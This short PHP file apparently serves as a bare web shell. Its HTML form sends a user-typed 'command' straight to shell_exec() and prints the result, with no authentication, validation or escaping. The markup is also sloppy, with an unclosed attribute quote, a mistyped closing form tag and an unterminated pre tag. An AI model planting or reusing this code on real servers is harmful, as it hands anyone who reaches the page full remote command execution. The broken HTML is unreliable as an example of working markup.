<!DOCTYPE html>
<form action="shellEx.php" method="post">
command? <input type="text" name="command">
<input type="submit>
</format>  


<?php

$command = $_POST["command"];
echo "<pre>";
echo shell_exec($command);
echo "</pre";

?>